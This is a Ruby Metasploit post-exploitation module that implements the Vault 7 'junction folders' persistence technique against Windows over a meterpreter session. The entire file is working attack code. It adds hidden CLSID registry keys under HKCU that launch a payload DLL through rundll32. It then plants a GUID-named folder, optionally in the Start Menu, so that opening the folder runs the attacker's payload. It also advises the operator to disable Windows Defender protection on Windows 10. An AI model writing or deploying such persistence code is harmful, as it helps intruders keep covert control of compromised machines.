require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'



#
# Metasploit Class name and mixins ..
#
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Error
         include Msf::Post::Windows::Registry



#
# The 'def initialize()' funtion ..
# Building Metasploit/Armitage info GUI/CLI description
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'vault7 junction folders [User-level Persistence]',
                        'Description'   => %q{
                                        Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a method in which the user can cause a redirection to another folder/appl. This module will add a registry hive in HKCU(CLSID) to be abble to execute our payload, then builds a Folder named POC.{GUID} that if accessed will trigger the execution of our payload. Also Check ADVANCED OPTIONS for PERSIST_EXPLORER (payload.dll) or RENAME_PERSIST (payload.dll) options.
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: r00t-3xp10it',                  # post-module author
                                        'Vuln discover: vault7 | wikileaks | nsa',      # vulnerability credits
                                        'special thanks: browninfosecguy | betto(ssa)', # module debug help
                                ],
 
                        'Version'        => '$Revision: 1.5',
                        'DisclosureDate' => 'jun 4 2018',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',   # thats no need for privilege escalation..
                        'Targets'        =>
                                [
                                         # Tested againts windows 2008 | windows 7 | Windows 10
                                         [ 'Windows 2008', 'Windows xp', 'windows vista', 'windows 7', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '4', # default its to run againts windows 7
                        'References'     =>
                                [
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'https://wikileaks.org/ciav7p1/cms/page_13763373.html' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1',                                       # run againts session 1
                                         'LOOT_FOLDER' => '/root/.msf4/loot',                    # default logs storage directory
                                         'APPL_PATH' => '%windir%\\System32\\calc.exe',          # Default appl (payload) to run
                                         'FOLDER_PATH' => 'C:\\Users\\%username%\\Desktop\\POC', # Default folder path (demo)
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('APPL_PATH', [ true, 'The full path of the appl or payload to run']),
                                OptString.new('FOLDER_PATH', [ true, 'The full path and name of folder to be created']),
                                OptString.new('LOOT_FOLDER', [ false, 'The full path [local] where to store logfiles'])
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('PERSIST_EXPLORER', [ false, 'Use explorer Start Menu to persiste our agent.dll?' , false]),
                                OptBool.new('RENAME_PERSIST', [ false, 'Rename Start Menu\\..\\Accessories to Accessories.{GUID}?' , false])
                        ], self.class) 

        end



def run
  session = client
  #
  # Variable declarations (msf API calls)
  #
  oscheck = client.fs.file.expand_path("%OS%")
  sysnfo = session.sys.config.sysinfo
  runtor = client.sys.config.getuid
  runsession = client.session_host
  directory = client.fs.dir.pwd
  # elevate session privileges befor runing options
  client.sys.config.getprivs.each do |priv|
  end
  #
  # MODULE BANNER
  #
  print_line("    +------------------------------------------------+")
  print_line("    | junction Shell Folders (User-Land Persistence) |")
  print_line("    |            Author : r00t-3xp10it (SSA)         |")
  print_line("    +------------------------------------------------+")
  print_line("")
  print_line("    Running on session  : #{datastore['SESSION']}")
  print_line("    Computer            : #{sysnfo['Computer']}")
  print_line("    Target IP addr      : #{runsession}")
  print_line("    Operative System    : #{sysnfo['OS']}")
  print_line("    Payload directory   : #{directory}")
  print_line("    Client UID          : #{runtor}")
  print_line("")
  print_line("")


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operative system (windows-not-wine)
    if not oscheck == "Windows_NT"
      print_error("[ ABORT ]: This module only works againts windows systems")
      return nil
    end
    #
    # check for proper operative system (not windows 10)
    #
    if sysinfo['OS'] =~ /Windows 10/
      print_line("windows 10 version its protected againts this exploit.")
      print_line("-------------------------------------------------------")
      print_line("Disable 'Controlled folder access' in Windows Defender")
      print_line("If you wish to teste this on windows 10 version distros")
      print_line("-------------------------------------------------------")
      Rex::sleep(7.0)
    end


  # variable declarations ..
  r=''
  hacks = []
  app_path = datastore['APPL_PATH']   # %windir%\\System32\\calc.exe
  fol_path = datastore['FOLDER_PATH'] # C:\\Users\%username%\Desktop\POC
  hive_key = "HKCU\\Software\\Classes\\CLSID" # uac hive key (CLSID)
  #
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['APPL_PATH'] == 'nil' || datastore['FOLDER_PATH'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set APPL_PATH | FOLDER_PATH!")
    return nil
  else
    print_status("junction shell folders (vault7 - nsa)")
    Rex::sleep(1.5)
  end

    #
    # Search in target regedit if hijack hive exists .. 
    #
    print_status("Reading target registry hive keys ..")
    Rex::sleep(1.0)
    if registry_enumkeys("HKCU\\Software\\Classes\\CLSID")
      print_status("Remote registry hive key found!")
      Rex::sleep(1.0)
    else
      # registry hive key not found, aborting module execution ..
      print_warning("Hive key: HKCU\\Software\\Classes\\CLSID")
      print_error("[ABORT]: module cant find the registry hive key needed ..")
      print_error("System does not appear to be vulnerable to the exploit code!")
      Rex::sleep(1.0)
      return nil
    end

      #
      # check if file/appl exists remote (APPL_PATH)
      #
      print_status("check if APPL exists in target ..")
      if session.fs.file.exist?(app_path)
        print_status("Application (payload) found ..")
      else
        print_error("Not found: #{app_path}")
        print_warning("Deploy your [payload] before using this module ..")
        print_warning("OR point to one existing application full path ..")
        Rex::sleep(1.0)
        return nil
      end


       #
       # GATHER INFO ABOUT TARGET SYSTEM .
       # store %AppData% directory full path ..
       print_status("Retriving %AppData% full path ..")
       Rex::sleep(1.0)
       data = client.fs.file.expand_path("%AppData%")
       # store username into a variable
       print_status("Retriving target %username% ..")
       Rex::sleep(1.0)
       user_name =  client.fs.file.expand_path("%username%")
       # create new GUID and store it in a variable
       print_status("Creating new GUID value ..")
       Rex::sleep(1.0)
       rep_GUID = cmd_exec("powershell.exe -ep -C \"[guid]::NewGuid().Guid\"")
       print_good("New GUID: #{rep_GUID}")
       # add parentesis to GUID value
       new_GUID = "{#{rep_GUID}}"
       Rex::sleep(1.0)


        #
        # List of registry keys to add to target regedit .. (rundll32.exe payload.dll,main)
        #
        if datastore['PERSIST_EXPLORER'] == true || datastore['RENAME_PERSIST'] == true
          print_warning("Persistance mode sellected")
          dll_exe = "rundll32 #{app_path},main"
          Rex::sleep(1.0)
          hacks = [
            "#{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d #{dll_exe} /f",
            "#{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d /f",
            "#{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment /f",
            "#{hive_key}\\#{new_GUID}\\ShellFolder /v Attributes /t REG_DWORD /d 0xf090013d /f",
            "#{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d /f"
          ]
        else
          #
          # DEMO mode (user inputs)
          #
          print_good("Demonstration mode sellected")
          Rex::sleep(1.0)
            hacks = [
              "#{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d #{app_path} /f"
            ]
        end


         #
         # LOOP funtion to add reg keys
         #
         session.response_timeout=120
         hacks.each do |cmd|
            begin
              # execute cmd prompt in a hidden channelized windows
              r = session.sys.process.execute("cmd.exe /c REG ADD #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
              print_line("    Hijack: #{cmd}")
 
                # close client channel when done
                while(d = r.channel.read)
                        break if d == ""
                end
                r.channel.close
                r.close
              # error exception funtion
              rescue ::Exception => e
              print_error("Error Running Command: #{e.class} #{e}")
            end
         end


       #
       # build POC folder (junction shell folders)
       #
       if datastore['PERSIST_EXPLORER'] == true
         folder_poc ="#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC"
         print_status("Creating junction shell folder ..")
         Rex::sleep(1.0)
         cmd_exec("cmd.exe /R mkdir \"#{folder_poc}.#{new_GUID}\"")
       elsif datastore['RENAME_PERSIST'] == true
         ren_per = "#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories"
         print_status("Creating junction shell folder ..")
         Rex::sleep(1.0)
         cmd_exec("cmd.exe /R rename \"#{ren_per} #{ren_per}.{new_GUID}\"")
       else
         print_status("Creating junction shell folder ..")
         Rex::sleep(1.0)
         cmd_exec("cmd.exe /R mkdir \"#{fol_path}.#{new_GUID}\"")
       end


     #
     # create cleaner resource file [local PC]
     #
     print_status("Writing cleaner resource file ..")
     Rex::sleep(1.0)
       rand = Rex::Text.rand_text_alpha(4)
       loot_folder = datastore['LOOT_FOLDER']
       File.open("#{loot_folder}/Clean_#{rand}.rc", "w") do |f|
       f.write("reg deletekey -k HKCU\\\\Software\\\\Classes\\\\CLSID\\\\#{new_GUID}")
       f.close
     end


  #
  # exploit finished (print info on screen)..
  #
  Rex::sleep(1.0)
  if datastore['PERSIST_EXPLORER'] == true
    print_line("---------------------------------------------------")
    print_line("Trigger exploit: #{folder_poc}")
    print_line("Resource file  : #{loot_folder}/Clean_#{rand}.rc")
    print_line("---------------------------------------------------")
  elsif datastore['RENAME_PERSIST'] == true
    print_line("---------------------------------------------------")
    print_line("Trigger exploit: #{ren_per}")
    print_line("Resource file  : #{loot_folder}/Clean_#{rand}.rc")
    print_line("Rename folder  : cmd.exe /c rename #{ren_per}.{new_GUID} #{ren_per}")
    print_line("---------------------------------------------------")
  else
    print_line("---------------------------------------------------")
    print_line("Trigger exploit: #{fol_path}")
    print_line("Resource file  : #{loot_folder}/Clean_#{rand}.rc")
    print_line("---------------------------------------------------")
  end


   #
   # end of the 'def run()' funtion (exploit code) ..
   #
   end

end